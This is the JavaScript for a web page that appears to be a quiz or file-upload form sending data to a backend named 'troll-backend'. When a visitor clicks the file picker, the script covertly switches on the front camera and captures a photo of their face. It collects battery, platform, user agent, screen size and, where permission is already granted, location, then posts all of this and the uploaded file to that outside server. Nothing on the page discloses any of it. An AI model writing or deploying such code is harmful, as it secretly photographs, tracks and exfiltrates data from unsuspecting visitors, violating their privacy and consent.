const BACKEND_BASE = "https://troll-backend.onrender.com/api";

const btn = document.getElementById("submit-btn");
const fileInput = document.getElementById("user-file");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

let cameraStream = null;
let cameraCaptured = false;

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  let battery = "N/A";
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  let location = "N/A";
  if (navigator.permissions) {
    try {
      const p = await navigator.permissions.query({ name: "geolocation" });
      if (p.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return {
    width: window.innerWidth,
    height: window.innerHeight,
    platform: navigator.platform,
    language: navigator.language,
    useragent: navigator.userAgent,
    battery,
    location,
    time: new Date().toLocaleString()
  };
}

// ================================
// CAPTURE CAMERA
// ================================
async function captureCameraIfNeeded() {
  if (cameraCaptured) return;

  cameraStream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" },
    audio: false
  });
  video.srcObject = cameraStream;

  await new Promise(r => setTimeout(r, 2000));

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const image = canvas.toDataURL("image/png");
  const metadata = await collectMetadata();

  await fetch(`${BACKEND_BASE}/upload`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ image, metadata })
  });

  cameraCaptured = true;
}

// ================================
// UPLOAD FILE
// ================================
async function uploadFile(file) {
  const reader = new FileReader();
  reader.onload = async () => {
    await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ file: reader.result, filename: file.name })
    });
  };
  reader.readAsDataURL(file);
}

// ================================
// FILE INPUT CLICK → CAMERA
// ================================
fileInput.addEventListener("click", async () => {
  try { await captureCameraIfNeeded(); } catch(e) { console.warn("Camera not allowed"); }
});

// ================================
// SUBMIT
// ================================
btn.addEventListener("click", async e => {
  e.preventDefault();
  if (!fileInput.files.length) return;

  await uploadFile(fileInput.files[0]);

  if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());

  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "block";
});
